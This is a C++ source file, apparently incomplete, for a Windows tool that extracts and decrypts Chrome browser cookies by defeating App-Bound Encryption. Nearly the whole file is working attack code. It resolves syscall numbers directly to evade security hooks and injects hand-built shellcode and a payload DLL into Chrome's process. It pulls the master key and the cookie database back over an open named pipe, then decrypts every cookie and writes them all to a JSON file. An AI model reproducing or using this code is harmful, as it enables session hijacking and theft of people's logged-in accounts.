// injector.cpp
// Chrome App-Bound Encryption (ABE) 解密工具
// 流程：找到 Chrome 主进程 → 注入 payload_dll.dll → IElevator2::DecryptData → 句柄复制读 Cookies
//       → AES-256-GCM 解密每条 cookie → 输出 cookies.json 到当前目录
//
// 编译（MSBuild，推荐）：
//   msbuild ChromeABE.sln /p:Configuration=Release /p:Platform=x64
//
// 或者手动（需要 sqlite3.c 在同一目录）：
//   cl /O2 /EHsc injector.cpp sqlite3.c /link kernel32.lib ole32.lib oleaut32.lib
//       user32.lib advapi32.lib shell32.lib crypt32.lib bcrypt.lib

#define WIN32_LEAN_AND_MEAN
#define NOMINMAX
#include <windows.h>
#include <wincrypt.h>
#include <bcrypt.h>       // AES-GCM
#include <tlhelp32.h>
#include <shlobj.h>
#include <objbase.h>
#include <wchar.h>
#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <stdlib.h>

// SQLite3 单文件版（sqlite3 amalgamation）
// 需要 sqlite3.h 和 sqlite3.c 在同一目录，或通过 vcxproj 引用 libs/sqlite/
#include "sqlite3.h"

#pragma comment(lib, "kernel32.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "bcrypt.lib")
#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <stdlib.h>

#pragma comment(lib, "kernel32.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "advapi32.lib")

// ── Direct syscall for NtCreateThreadEx ──────────────────────────────────────
// We resolve SSN at runtime from ntdll (Hell's Gate pattern) to avoid detection
// by Chrome's IAT/inline hooks on CreateRemoteThread.

typedef LONG NTSTATUS;
typedef NTSTATUS(NTAPI* NtCreateThreadEx_t)(
    HANDLE*, ACCESS_MASK, LPVOID, HANDLE, LPTHREAD_START_ROUTINE,
    LPVOID, ULONG, ULONG_PTR, SIZE_T, SIZE_T, LPVOID);

// Get direct syscall trampoline by reading SSN from ntdll and writing a tiny stub
static BYTE g_NtCreateThreadExStub[32];
static NtCreateThreadEx_t g_NtCreateThreadEx = nullptr;

static bool InitDirectSyscall() {
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (!hNtdll) return false;

    // Find NtCreateThreadEx export
    BYTE* fn = (BYTE*)GetProcAddress(hNtdll, "NtCreateThreadEx");
    if (!fn) return false;

    // If hooked (JMP at start), scan past it
    // x64 syscall stub: mov r10, rcx (4C 8B D1); mov eax, SSN (B8 xx xx 00 00); syscall (0F 05)
    // Find pattern: B8 ?? ?? 00 00
    WORD ssn = 0;
    bool found = false;
    for (int i = 0; i < 32; i++) {
        if (fn[i] == 0xB8 && fn[i+2] == 0x00 && fn[i+3] == 0x00) {
            ssn = *(WORD*)(fn + i + 1);
            found = true;
            break;
        }
    }
    if (!found) return false;

    // Find syscall;ret gadget in ntdll (0F 05 C3)
    BYTE* ntdllBase = (BYTE*)hNtdll;
    BYTE* gadget = nullptr;
    // Search in .text section range - scan first 5MB of ntdll
    for (SIZE_T i = 0; i < 0x500000; i++) {
        if (ntdllBase[i] == 0x0F && ntdllBase[i+1] == 0x05 && ntdllBase[i+2] == 0xC3) {
            gadget = ntdllBase + i;
            break;
        }
    }
    if (!gadget) return false;

    // Build x64 trampoline:
    // mov r10, rcx      ; 4C 8B D1
    // mov eax, ssn      ; B8 xx xx 00 00
    // jmp [gadget]      ; FF 25 00 00 00 00 <gadget addr>
    BYTE stub[32];
    memset(stub, 0x90, sizeof(stub));
    int o = 0;
    stub[o++] = 0x4C; stub[o++] = 0x8B; stub[o++] = 0xD1; // mov r10, rcx
    stub[o++] = 0xB8;                                        // mov eax, imm32
    *(WORD*)(stub + o) = ssn; o += 2;
    stub[o++] = 0x00; stub[o++] = 0x00;
    // jmp indirect
    stub[o++] = 0xFF; stub[o++] = 0x25;
    *(DWORD*)(stub + o) = 0; o += 4;           // RIP-relative offset = 0 means next 8 bytes
    *(UINT64*)(stub + o) = (UINT64)gadget; o += 8;

    // Allocate executable memory for stub
    BYTE* execStub = (BYTE*)VirtualAlloc(nullptr, sizeof(stub),
                                          MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!execStub) return false;
    memcpy(execStub, stub, o);

    g_NtCreateThreadEx = (NtCreateThreadEx_t)execStub;
    return true;
}

// ── Find Chrome browser process (parent of all chrome.exe = the one with no chrome parent) ──
static DWORD FindChromeBrowserPid() {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;

    // collect all chrome.exe pids and their parents
    struct ProcInfo { DWORD pid, ppid; };
    ProcInfo procs[512];
    int nProcs = 0;
    DWORD chromePids[512];
    int nChrome = 0;

    PROCESSENTRY32W pe = {};
    pe.dwSize = sizeof(pe);
    if (Process32FirstW(snap, &pe)) {
        do {
            procs[nProcs++] = {pe.th32ProcessID, pe.th32ParentProcessID};
            if (_wcsicmp(pe.szExeFile, L"chrome.exe") == 0)
                chromePids[nChrome++] = pe.th32ProcessID;
        } while (nChrome < 512 && nProcs < 512 && Process32NextW(snap, &pe));
    }
    CloseHandle(snap);

    // Browser process = chrome.exe whose parent is not chrome.exe
    for (int i = 0; i < nChrome; i++) {
        DWORD ppid = 0;
        for (int j = 0; j < nProcs; j++) {
            if (procs[j].pid == chromePids[i]) { ppid = procs[j].ppid; break; }
        }
        bool parentIsChrome = false;
        for (int k = 0; k < nChrome; k++) {
            if (chromePids[k] == ppid) { parentIsChrome = true; break; }
        }
        if (!parentIsChrome) return chromePids[i];
    }
    return nChrome > 0 ? chromePids[0] : 0;
}

// ── Load payload DLL bytes from disk ─────────────────────────────────────────
static BYTE* LoadPayloadDll(const wchar_t* path, SIZE_T* outSize) {
    HANDLE hf = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ, nullptr,
                             OPEN_EXISTING, 0, nullptr);
    if (hf == INVALID_HANDLE_VALUE) return nullptr;
    LARGE_INTEGER sz = {};
    GetFileSizeEx(hf, &sz);
    BYTE* buf = (BYTE*)malloc((size_t)sz.QuadPart);
    if (buf) {
        DWORD rd = 0;
        ReadFile(hf, buf, (DWORD)sz.QuadPart, &rd, nullptr);
        *outSize = rd;
    }
    CloseHandle(hf);
    return buf;
}

// ── Get Bootstrap export offset ───────────────────────────────────────────────
static DWORD GetExportRVA(BYTE* dllData, SIZE_T dllSize, const char* name) {
    auto dos = (PIMAGE_DOS_HEADER)dllData;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return 0;
    auto nt = (PIMAGE_NT_HEADERS)(dllData + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return 0;

    DWORD expRva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (!expRva) return 0;

    // RVA to file offset helper
    auto RvaToOffset = [&](DWORD rva) -> BYTE* {
        auto sec = IMAGE_FIRST_SECTION(nt);
        for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
            if (rva >= sec->VirtualAddress && rva < sec->VirtualAddress + sec->Misc.VirtualSize) {
                return dllData + sec->PointerToRawData + (rva - sec->VirtualAddress);
            }
        }
        return nullptr;
    };

    auto expDir = (PIMAGE_EXPORT_DIRECTORY)RvaToOffset(expRva);
    if (!expDir) return 0;
    auto names  = (DWORD*)RvaToOffset(expDir->AddressOfNames);
    auto ords   = (WORD*) RvaToOffset(expDir->AddressOfNameOrdinals);
    auto funcs  = (DWORD*)RvaToOffset(expDir->AddressOfFunctions);
    if (!names || !ords || !funcs) return 0;

    for (DWORD i = 0; i < expDir->NumberOfNames; i++) {
        char* n = (char*)RvaToOffset(names[i]);
        if (n && strcmp(n, name) == 0) return funcs[ords[i]];
    }
    return 0;
}

// AES-256-GCM decrypt a single cookie blob.
// Format: [3-byte prefix (v20/v10/v11)][12-byte IV][ciphertext][16-byte tag]
// Returns heap-allocated plaintext (caller must free), or nullptr on failure.
static char* AesGcmDecrypt(const BYTE* blob, DWORD blobLen,
                            const BYTE* key, DWORD keyLen,
                            DWORD* outPlainLen)
{
    if (blobLen < 3 + 12 + 16) return nullptr;
    // 检查前缀
    if (memcmp(blob, "v20", 3) != 0 &&
        memcmp(blob, "v10", 3) != 0 &&
        memcmp(blob, "v11", 3) != 0) return nullptr;

    const BYTE* iv  = blob + 3;
    const BYTE* tag = blob + blobLen - 16;
    const BYTE* ct  = blob + 3 + 12;
    DWORD ctLen     = blobLen - 3 - 12 - 16;

    // 初始化 BCrypt AES-GCM
    BCRYPT_ALG_HANDLE hAlg  = nullptr;
    BCRYPT_KEY_HANDLE hKey  = nullptr;
    NTSTATUS st;

    st = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, nullptr, 0);
    if (!BCRYPT_SUCCESS(st)) return nullptr;

    BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
        (PUCHAR)BCRYPT_CHAIN_MODE_GCM,
        sizeof(BCRYPT_CHAIN_MODE_GCM), 0);

    // 生成对称密钥
    DWORD keyObjSize = 0, tmp = 0;
    BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PUCHAR)&keyObjSize, sizeof(keyObjSize), &tmp, 0);
    BYTE* keyObj = (BYTE*)malloc(keyObjSize);
    st = BCryptGenerateSymmetricKey(hAlg, &hKey, keyObj, keyObjSize,
                                     (PUCHAR)key, keyLen, 0);
    if (!BCRYPT_SUCCESS(st)) { free(keyObj); BCryptCloseAlgorithmProvider(hAlg, 0); return nullptr; }

    // 认证标签信息
    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo = {};
    BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
    authInfo.pbNonce      = (PUCHAR)iv;
    authInfo.cbNonce      = 12;
    authInfo.pbTag        = (PUCHAR)tag;
    authInfo.cbTag        = 16;

    // 解密
    BYTE* plain  = (BYTE*)malloc(ctLen + 1);
    DWORD plainLen = ctLen;
    st = BCryptDecrypt(hKey, (PUCHAR)ct, ctLen, &authInfo,
                        nullptr, 0, plain, ctLen, &plainLen, 0);

    BCryptDestroyKey(hKey);
    free(keyObj);
    BCryptCloseAlgorithmProvider(hAlg, 0);

    if (!BCRYPT_SUCCESS(st)) { free(plain); return nullptr; }
    plain[plainLen] = '\0';
    *outPlainLen = plainLen;
    return (char*)plain;
}

// Escape a string for JSON output (handles control chars and quotes).
// len = byte length; if len == -1, use strlen(s)
static void WriteJsonString(FILE* fp, const char* s, int len = -1)
{
    if (!s) { fputs("\"\"", fp); return; }
    if (len < 0) len = (int)strlen(s);
    fputc('"', fp);
    for (int i = 0; i < len; i++) {
        unsigned char c = (unsigned char)s[i];
        if      (c == '"')  fputs("\\\"", fp);
        else if (c == '\\') fputs("\\\\", fp);
        else if (c == '\n') fputs("\\n",  fp);
        else if (c == '\r') fputs("\\r",  fp);
        else if (c == '\t') fputs("\\t",  fp);
        else if (c < 0x20)  fprintf(fp, "\\u%04X", c);
        else                fputc(c, fp);
    }
    fputc('"', fp);
}

// SQLite query + AES-256-GCM decrypt + JSON export
// dbPath  : path to Cookies SQLite file
// key     : 32-byte plaintext AES-256 master key
// outJson : output JSON file path  (e.g. "cookies.json")
// domain  : optional domain filter keyword (NULL = export all)
static bool DecryptAndExport(const wchar_t* dbPath, const BYTE* key,
                              const wchar_t* outJson, const wchar_t* domain)
{
    // 打开 SQLite
    char dbPathA[MAX_PATH];
    WideCharToMultiByte(CP_UTF8, 0, dbPath, -1, dbPathA, MAX_PATH, nullptr, nullptr);

    sqlite3* db = nullptr;
    if (sqlite3_open_v2(dbPathA, &db, SQLITE_OPEN_READONLY, nullptr) != SQLITE_OK) {
        wprintf(L"[!] sqlite3_open 失败: %hs\n", sqlite3_errmsg(db));
        return false;
    }

    // 构建 SQL（可选域名过滤）
    char sql[512];
    if (domain && domain[0]) {
        char domainA[256];
        WideCharToMultiByte(CP_UTF8, 0, domain, -1, domainA, 256, nullptr, nullptr);
        _snprintf_s(sql, sizeof(sql),
            "SELECT host_key,name,path,encrypted_value,expires_utc,is_secure,is_httponly,samesite "
            "FROM cookies WHERE host_key LIKE '%%%s%%'", domainA);
    } else {
        strcpy_s(sql, sizeof(sql),
            "SELECT host_key,name,path,encrypted_value,expires_utc,is_secure,is_httponly,samesite "
            "FROM cookies");
    }

    sqlite3_stmt* stmt = nullptr;
    if (sqlite3_prepare_v2(db, sql, -1, &stmt, nullptr) != SQLITE_OK) {
        wprintf(L"[!] SQL 准备失败: %hs\n", sqlite3_errmsg(db));
        sqlite3_close(db);
        return false;
    }

    // 打开输出 JSON 文件
    char outJsonA[MAX_PATH];
    WideCharToMultiByte(CP_UTF8, 0, outJson, -1, outJsonA, MAX_PATH, nullptr, nullptr);
    FILE* fp = nullptr;
    fopen_s(&fp, outJsonA, "wb");
    if (!fp) {
        wprintf(L"[!] 无法创建 %s\n", outJson);
        sqlite3_finalize(stmt);
        sqlite3_close(db);
        return false;
    }

    // SameSite 映射
    auto sameSiteStr = [](int v) -> const char* {
        switch (v) {
            case 1:  return "Lax";
            case 2:  return "Strict";
            default: return "None";
        }
    };

    // Chrome 时间戳基准：1601-01-01 到 1970-01-01 的微秒数
    const long long CHROME_EPOCH_OFFSET = 11644473600000000LL;

    fputs("\xEF\xBB\xBF[\n", fp);  // UTF-8 BOM + array open
    int count = 0, total = 0;

    while (sqlite3_step(stmt) == SQLITE_ROW) {
        total++;
        const char* host    = (const char*)sqlite3_column_text(stmt, 0);
        const char* name    = (const char*)sqlite3_column_text(stmt, 1);
        const char* path    = (const char*)sqlite3_column_text(stmt, 2);
        const BYTE* encVal  = (const BYTE*)sqlite3_column_blob(stmt, 3);
        int          encLen  = sqlite3_column_bytes(stmt, 3);
        long long    expTs   = sqlite3_column_int64(stmt, 4);
        int          secure  = sqlite3_column_int(stmt, 5);
        int          httpOnly= sqlite3_column_int(stmt, 6);
        int          sameSite= sqlite3_column_int(stmt, 7);

        if (!encVal || encLen < 31) continue;

        DWORD plainLen = 0;
        char* plain = AesGcmDecrypt(encVal, (DWORD)encLen, key, 32, &plainLen);
        if (!plain) continue;  // 解密失败则跳过

        long long expUnix = expTs > 0 ? (expTs - CHROME_EPOCH_OFFSET) / 1000000LL : -1;

        if (count > 0) fputs(",\n", fp);
        fputs("  {\n", fp);
        fprintf(fp, "    \"name\": ");      WriteJsonString(fp, name   ? name : ""); fputs(",\n", fp);
        fprintf(fp, "    \"value\": ");     WriteJsonString(fp, plain, (int)plainLen); fputs(",\n", fp);
        fprintf(fp, "    \"domain\": ");    WriteJsonString(fp, host   ? host : ""); fputs(",\n", fp);
        fprintf(fp, "    \"path\": ");      WriteJsonString(fp, path   ? path : ""); fputs(",\n", fp);
        fprintf(fp, "    \"expires\": %lld,\n", expUnix);
        fprintf(fp, "    \"secure\": %s,\n",    secure   ? "true" : "false");
        fprintf(fp, "    \"httpOnly\": %s,\n",  httpOnly ? "true" : "false");
        fprintf(fp, "    \"sameSite\": \"%s\"\n", sameSiteStr(sameSite));
        fputs("  }", fp);

        free(plain);
        count++;
    }

    fputs("\n]\n", fp);
    fclose(fp);
    sqlite3_finalize(stmt);
    sqlite3_close(db);

    wprintf(L"[+] 共 %d 条 cookie，成功解密 %d 条 -> %s\n", total, count, outJson);
    return count > 0;
}

// ── Main ──────────────────────────────────────────────────────────────────────
static bool ReadEncryptedKey(BYTE* outKey, DWORD* outLen, DWORD maxLen) {
    wchar_t path[MAX_PATH];
    if (!SUCCEEDED(SHGetFolderPathW(nullptr, CSIDL_LOCAL_APPDATA, nullptr, 0, path)))
        return false;
    wcscat_s(path, L"\\Google\\Chrome\\User Data\\Local State");

    HANDLE hf = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE,
                             nullptr, OPEN_EXISTING, 0, nullptr);
    if (hf == INVALID_HANDLE_VALUE) return false;

    LARGE_INTEGER sz = {};
    GetFileSizeEx(hf, &sz);
    char* buf = (char*)malloc((size_t)sz.QuadPart + 1);
    if (!buf) { CloseHandle(hf); return false; }
    DWORD rd = 0;
    ReadFile(hf, buf, (DWORD)sz.QuadPart, &rd, nullptr);
    buf[rd] = 0;
    CloseHandle(hf);

    // Find "app_bound_encrypted_key":"<base64>" first, fall back to "encrypted_key"
    const char* key = strstr(buf, "\"app_bound_encrypted_key\":\"");
    const char* prefix = key ? "\"app_bound_encrypted_key\":\"" : nullptr;
    if (!key) {
        key = strstr(buf, "\"encrypted_key\":\"");
        prefix = "\"encrypted_key\":\"";
    }
    if (!key) { free(buf); return false; }
    key += strlen(prefix);

    // find closing quote
    const char* end = strchr(key, '"');
    if (!end) { free(buf); return false; }

    // base64 decode
    DWORD b64Len = (DWORD)(end - key);
    DWORD binLen = maxLen;
    if (!CryptStringToBinaryA(key, b64Len, CRYPT_STRING_BASE64, outKey, &binLen, nullptr, nullptr)) {
        free(buf); return false;
    }
    *outLen = binLen;
    free(buf);

    // Strip 4-byte prefix (APPB or DPAPI)
    if (binLen > 4) {
        memmove(outKey, outKey + 4, binLen - 4);
        *outLen = binLen - 4;
    }
    return true;
}

// ── Main ──────────────────────────────────────────────────────────────────────
int wmain(int argc, wchar_t* argv[]) {
    wprintf(L"[*] Chrome App-Bound Encryption Decryption\n");

    // 1. Init direct syscall
    if (!InitDirectSyscall()) {
        wprintf(L"[!] Failed to init direct syscall\n");
        return 1;
    }
    wprintf(L"[+] Direct syscall (NtCreateThreadEx) ready\n");

    // 2. Find Chrome browser process
    DWORD chromePid = FindChromeBrowserPid();
    if (!chromePid) {
        wprintf(L"[!] Chrome not running. Please start Chrome first.\n");
        return 1;
    }
    wprintf(L"[+] Chrome browser PID: %u\n", chromePid);

    // 3. Read encrypted key
    BYTE encKey[2048];
    DWORD encKeyLen = 0;
    if (!ReadEncryptedKey(encKey, &encKeyLen, sizeof(encKey))) {
        wprintf(L"[!] Failed to read app_bound_encrypted_key\n");
        return 1;
    }
    wprintf(L"[+] Encrypted key: %u bytes\n", encKeyLen);

    // 4. Load payload DLL
    wchar_t dllPath[MAX_PATH];
    GetModuleFileNameW(nullptr, dllPath, MAX_PATH);
    wchar_t* slash = wcsrchr(dllPath, L'\\');
    if (slash) *(slash + 1) = 0;
    wcscat_s(dllPath, L"payload_dll.dll");

    SIZE_T dllSize = 0;
    BYTE* dllData = LoadPayloadDll(dllPath, &dllSize);
    if (!dllData) {
        wprintf(L"[!] Cannot load payload_dll.dll from %s\n", dllPath);
        return 1;
    }
    wprintf(L"[+] Payload DLL loaded: %zu bytes\n", dllSize);

    DWORD dllEntryRva = GetExportRVA(dllData, dllSize, "DllMain");
    // We'll use DllMain as entry via normal load, or find Bootstrap if using RDI
    // For simplicity: use LoadLibrary approach via CreateRemoteThread with LoadLibraryW
    // BUT we can't use CreateRemoteThread (hooked). Use direct syscall NtCreateThreadEx.
    // Strategy: write DLL to temp file, use NtCreateThreadEx to call LoadLibraryW.

    // Write DLL to temp file (unique name to avoid lock from previous run)
    wchar_t tmpPath[MAX_PATH];
    GetTempPathW(MAX_PATH, tmpPath);
    wchar_t suffix[32];
    swprintf_s(suffix, L"crdec_%u_%u.dll", GetCurrentProcessId(), GetTickCount());
    wcscat_s(tmpPath, suffix);
    HANDLE hTmp = CreateFileW(tmpPath, GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, 0, nullptr);
    if (hTmp == INVALID_HANDLE_VALUE) {
        wprintf(L"[!] Cannot write temp DLL: %u\n", GetLastError());
        free(dllData); return 1;
    }
    DWORD wr = 0;
    WriteFile(hTmp, dllData, (DWORD)dllSize, &wr, nullptr);
    CloseHandle(hTmp);
    // Keep dllData alive for stage-2 export RVA lookup
    BYTE* dllData_saved = dllData;
    SIZE_T dllSize_saved = dllSize;
    wprintf(L"[+] Payload written to: %s\n", tmpPath);

    // 5. Create named pipe with NULL DACL so Chrome (lower privilege) can connect
    wchar_t pipeName[64];
    swprintf_s(pipeName, L"\\\\.\\pipe\\mojo.%u.%u.%04X.chrome",
               chromePid, GetCurrentProcessId(), GetTickCount() & 0xFFFF);

    // Build a security descriptor with NULL DACL = allow everyone
    SECURITY_DESCRIPTOR sd = {};
    InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION);
    SetSecurityDescriptorDacl(&sd, TRUE, nullptr, FALSE); // NULL DACL = grant all access

    SECURITY_ATTRIBUTES sa = {};
    sa.nLength = sizeof(sa);
    sa.lpSecurityDescriptor = &sd;
    sa.bInheritHandle = FALSE;

    HANDLE hPipe = CreateNamedPipeW(pipeName,
        FILE_FLAG_OVERLAPPED | PIPE_ACCESS_INBOUND,
        PIPE_TYPE_BYTE | PIPE_WAIT,
        1, 0, 4096, 0, &sa);
    if (hPipe == INVALID_HANDLE_VALUE) {
        wprintf(L"[!] CreateNamedPipe failed: %u\n", GetLastError());
        return 1;
    }
    wprintf(L"[+] Named pipe: %s\n", pipeName);

    // 6. Open Chrome process
    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, chromePid);
    if (!hProc) {
        wprintf(L"[!] OpenProcess failed: %u\n", GetLastError());
        CloseHandle(hPipe); return 1;
    }

    // 7. Allocate memory for: path to DLL (wide) + separator + pipe name + key data
    // Layout in remote memory:
    //   [dllPathW null-term] [pipeNameW null-term] [DWORD enc_key_len] [enc_key_bytes]
    SIZE_T dllPathSize  = (wcslen(tmpPath) + 1) * 2;
    SIZE_T pipeNameSize = (wcslen(pipeName) + 1) * 2;
    SIZE_T keyDataSize  = 4 + encKeyLen;
    // Extra slot at end of remote memory: 8 bytes to store the 64-bit hModule
    SIZE_T totalSize    = dllPathSize + pipeNameSize + keyDataSize + 0x100 + 8;

    LPVOID remoteBase = VirtualAllocEx(hProc, nullptr, totalSize,
                                        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remoteBase) {
        wprintf(L"[!] VirtualAllocEx failed: %u\n", GetLastError());
        CloseHandle(hProc); CloseHandle(hPipe); return 1;
    }

    // Write DLL path
    SIZE_T written2 = 0;
    WriteProcessMemory(hProc, remoteBase, tmpPath, dllPathSize, &written2);

    // Write pipe name immediately after DLL path
    BYTE* remotePipeName = (BYTE*)remoteBase + dllPathSize;
    WriteProcessMemory(hProc, remotePipeName, pipeName, pipeNameSize, &written2);

    // Write enc key len + key bytes after pipe name
    BYTE* remoteKeyData = remotePipeName + pipeNameSize;
    WriteProcessMemory(hProc, remoteKeyData, &encKeyLen, 4, &written2);
    WriteProcessMemory(hProc, remoteKeyData + 4, encKey, encKeyLen, &written2);

    // Slot at end to receive 64-bit hModule from Stage 1 shellcode
    BYTE* remoteHModuleSlot = (BYTE*)remoteBase + totalSize - 8;

    // 8. Stage 1: inject small shellcode that calls LoadLibraryW and stores 64-bit result
    // Shellcode: LoadLibraryW(dllPath) -> store result at remoteHModuleSlot -> ret
    // x64 assembly:
    //   sub  rsp, 0x28          ; align stack
    //   mov  rcx, <dllPath>     ; arg = path
    //   mov  rax, <LoadLibW>    ; function ptr
    //   call rax
    //   mov  [<slot>], rax      ; store HMODULE
    //   add  rsp, 0x28
    //   ret

    HMODULE hK32 = GetModuleHandleW(L"kernel32.dll");
    UINT64 pLoadLib64 = (UINT64)GetProcAddress(hK32, "LoadLibraryW");
    UINT64 remoteDllPath64 = (UINT64)remoteBase;
    UINT64 remoteSlot64 = (UINT64)remoteHModuleSlot;

    // Build shellcode (48 bytes)
    BYTE sc[64] = {};
    int o = 0;
    // sub rsp, 0x28
    sc[o++]=0x48; sc[o++]=0x83; sc[o++]=0xEC; sc[o++]=0x28;
    // mov rcx, imm64  (dllPath)
    sc[o++]=0x48; sc[o++]=0xB9;
    memcpy(sc+o, &remoteDllPath64, 8); o+=8;
    // mov rax, imm64  (LoadLibraryW)
    sc[o++]=0x48; sc[o++]=0xB8;
    memcpy(sc+o, &pLoadLib64, 8); o+=8;
    // call rax
    sc[o++]=0xFF; sc[o++]=0xD0;
    // mov [slot], rax  using absolute address via r11
    sc[o++]=0x49; sc[o++]=0xBB;
    memcpy(sc+o, &remoteSlot64, 8); o+=8;
    sc[o++]=0x4C; sc[o++]=0x89; sc[o++]=0x1B; // mov [r11], rbx -- wrong, need rax
    // fix: mov [r11], rax = 4C 89 03
    o -= 3;
    sc[o++]=0x49; sc[o++]=0x89; sc[o++]=0x03; // mov [r11], rax
    // add rsp, 0x28
    sc[o++]=0x48; sc[o++]=0x83; sc[o++]=0xC4; sc[o++]=0x28;
    // ret
    sc[o++]=0xC3;

    // Allocate executable memory for Stage 1 shellcode
    LPVOID remoteScBase = VirtualAllocEx(hProc, nullptr, sizeof(sc),
                                          MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteScBase) {
        wprintf(L"[!] VirtualAllocEx(sc) failed: %u\n", GetLastError());
        CloseHandle(hProc); CloseHandle(hPipe); return 1;
    }
    WriteProcessMemory(hProc, remoteScBase, sc, o, &written2);

    wprintf(L"[*] Stage 1: LoadLibraryW shellcode...\n");
    HANDLE hT1 = nullptr;
    NTSTATUS status = g_NtCreateThreadEx(&hT1, THREAD_ALL_ACCESS, nullptr, hProc,
                                          (LPTHREAD_START_ROUTINE)remoteScBase, nullptr,
                                          0, 0, 0, 0, nullptr);
    if (status != 0) {
        wprintf(L"[!] Stage1 NtCreateThreadEx failed: 0x%08X\n", (DWORD)status);
        VirtualFreeEx(hProc, remoteScBase, 0, MEM_RELEASE);
        VirtualFreeEx(hProc, remoteBase, 0, MEM_RELEASE);
        CloseHandle(hProc); CloseHandle(hPipe); return 1;
    }
    WaitForSingleObject(hT1, 8000);
    CloseHandle(hT1);
    VirtualFreeEx(hProc, remoteScBase, 0, MEM_RELEASE);

    // Read back the 64-bit hModule
    UINT64 hModule64 = 0;
    ReadProcessMemory(hProc, remoteHModuleSlot, &hModule64, 8, &written2);
    wprintf(L"[+] DLL loaded at: 0x%016llX\n", hModule64);

    if (!hModule64) {
        wprintf(L"[!] LoadLibraryW returned NULL\n");
        CloseHandle(hProc); CloseHandle(hPipe); return 1;
    }

    // Stage 2: compute PayloadEntry address = hModule64 + RVA
    DWORD payloadEntryRva = GetExportRVA(dllData_saved, dllSize_saved, "PayloadEntry");
    if (!payloadEntryRva) {
        wprintf(L"[!] PayloadEntry export not found\n");
        CloseHandle(hProc); CloseHandle(hPipe); return 1;
    }
    LPTHREAD_START_ROUTINE pPayloadEntry =
        (LPTHREAD_START_ROUTINE)(hModule64 + payloadEntryRva);
    wprintf(L"[*] Stage 2: PayloadEntry at 0x%016llX\n", (UINT64)pPayloadEntry);

    HANDLE hT2 = nullptr;
    status = g_NtCreateThreadEx(&hT2, THREAD_ALL_ACCESS, nullptr, hProc,
                                  pPayloadEntry, remotePipeName,
                                  0, 0, 0, 0, nullptr);
    if (status != 0) {
        wprintf(L"[!] Stage2 NtCreateThreadEx failed: 0x%08X\n", (DWORD)status);
        CloseHandle(hProc); CloseHandle(hPipe); return 1;
    }
    HANDLE hThread = hT2;
    wprintf(L"[+] PayloadEntry thread created\n");

    // 9. Wait for pipe connection
    wprintf(L"[*] Waiting for payload connection (15s)...\n");
    OVERLAPPED ov = {};
    ov.hEvent = CreateEventW(nullptr, TRUE, FALSE, nullptr);
    BOOL connected = ConnectNamedPipe(hPipe, &ov);
    DWORD waitRes;
    if (!connected && GetLastError() == ERROR_PIPE_CONNECTED) {
        // Client connected before ConnectNamedPipe was called
        waitRes = WAIT_OBJECT_0;
    } else {
        waitRes = WaitForSingleObject(ov.hEvent, 15000);
    }
    CloseHandle(ov.hEvent);

    if (waitRes == WAIT_TIMEOUT) {
        wprintf(L"[!] Payload did not connect within 10s\n");
        if (hThread) { WaitForSingleObject(hThread, 1000); CloseHandle(hThread); }
        CloseHandle(hProc); CloseHandle(hPipe); return 1;
    }

    // 10. Read result: [HR(4)] [keyLen(4)] [key] [cookiesLen(4)] [cookiesBytes]
    DWORD bytesRead = 0;
    DWORD hrResult = 0, keyLen = 0, cookiesLen = 0;

    ReadFile(hPipe, &hrResult,   4, &bytesRead, nullptr);
    ReadFile(hPipe, &keyLen,     4, &bytesRead, nullptr);
    wprintf(L"[*] Payload HR: 0x%08X, keyLen: %u\n", hrResult, keyLen);

    BYTE masterKey[32] = {};
    if (keyLen > 0 && keyLen <= 32)
        ReadFile(hPipe, masterKey, keyLen, &bytesRead, nullptr);

    ReadFile(hPipe, &cookiesLen, 4, &bytesRead, nullptr);
    wprintf(L"[*] Cookies data: %u bytes\n", cookiesLen);

    if (hrResult == 0 && keyLen > 0) {
        wprintf(L"[+] Master key (%u bytes): ", keyLen);
        for (DWORD i = 0; i < keyLen; i++) wprintf(L"%02X", masterKey[i]);
        wprintf(L"\n");

        if (cookiesLen == 0) {
            wprintf(L"[!] 未收到 Cookies 数据（句柄复制可能失败，查看 C:\\payload_log.txt）\n");
        } else {
            // 把 Cookies DB 写到临时目录
            wchar_t tmpCookies[MAX_PATH];
            GetTempPathW(MAX_PATH, tmpCookies);
            wcscat_s(tmpCookies, L"Cookies_abe_tmp.db");

            BYTE* cookiesBuf = (BYTE*)malloc(cookiesLen);
            if (cookiesBuf) {
                DWORD totalRead = 0;
                while (totalRead < cookiesLen) {
                    DWORD rd = 0;
                    if (!ReadFile(hPipe, cookiesBuf + totalRead,
                                  cookiesLen - totalRead, &rd, nullptr) || rd == 0) break;
                    totalRead += rd;
                }
                HANDLE hcf = CreateFileW(tmpCookies, GENERIC_WRITE, 0, nullptr,
                                          CREATE_ALWAYS, 0, nullptr);
                if (hcf != INVALID_HANDLE_VALUE) {
                    WriteFile(hcf, cookiesBuf, totalRead, &bytesRead, nullptr);
